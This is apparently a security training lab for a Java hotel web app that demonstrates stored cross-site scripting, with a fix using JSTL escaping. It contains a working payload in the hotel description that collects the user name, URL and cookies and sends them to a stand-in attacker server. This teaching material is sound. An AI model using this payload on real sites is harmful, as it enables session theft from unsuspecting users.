Java: XSS
=========

Scenario summary
----------------

The attacker will create an hotel description that has an embedded script that
will send the cookies of a user browsing the web site to the attacker website.

Scenario description
--------------------

To test whether the injection is possible, write in the description field the
following code:

	<script>alert('hello');</script>

To send the cookies of users to an evil website, set the following code as the
description of an hotel.

	<h3>That hotel!</h3>
	<div id="myHotel">Welcome!</div>
	<script type="text/javascript">
	var data = "";
	data += "[user: " + $("#login a.btn-primary").text() + "]";
	data += "[url: " + document.location.href + "]";
	data += "[cookie: " + document.cookie + "]";
	var imgsrc = "http://localhost:8081/evilhotel/sendData?data=" + escape(data);
	$("<img />").attr("src", imgsrc).appendTo($("#myHotel"));
	</script>

In the *evil-website* console, the user information should appear.
The sent request can also be seen using *FireBug* or *WebScarab*.

(Don't forget to change the host with what is needed...)

Vulnerable code
---------------

In the views, the view `hotel/view.jsp` will not escape the value of the hotel
description.

The *evil-website* server must be deployed for this attack to work.

Preventing the attack
---------------------

*All* data that is printed as HTML must be escaped or at least "white list"
validated.

To escape HTML using JSP, use the available JSTL:

	<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>

	<!-- valid string -->
	<c:out value="${myString}"/>
	<!-- possible injection -->
	${myString}

